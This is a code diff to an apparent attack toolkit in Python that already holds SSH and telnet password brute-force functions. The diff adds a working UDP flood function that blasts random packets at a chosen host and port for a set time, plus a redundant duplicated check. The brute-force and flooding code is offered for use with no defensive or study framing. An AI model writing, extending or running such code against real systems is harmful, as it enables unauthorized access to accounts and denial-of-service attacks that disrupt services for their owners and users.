@@ -2,6 +2,8 @@ import paramiko
 import asyncio
 import telnetlib3
 import time
+import socket
+import random
 
 def brute_force_ssh(target, username, password_list, port=22):
     client = paramiko.SSHClient()
@@ -84,4 +86,22 @@ def brute_force_telnet(target, username, password_list, port=23):
     if not results:
         results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
         
+    if not results:
+        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
+        
     return results
+
+def udp_flood(target, port, duration):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_to_send = random._urandom(1024)
+    timeout = time.time() + duration
+    sent = 0
+
+    try:
+        while time.time() < timeout:
+            client.sendto(bytes_to_send, (target, port))
+            sent += 1
+            
+        return {"status": "success", "message": f"UDP Flood finished. Sent {sent} packets to {target}:{port} in {duration}s."}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
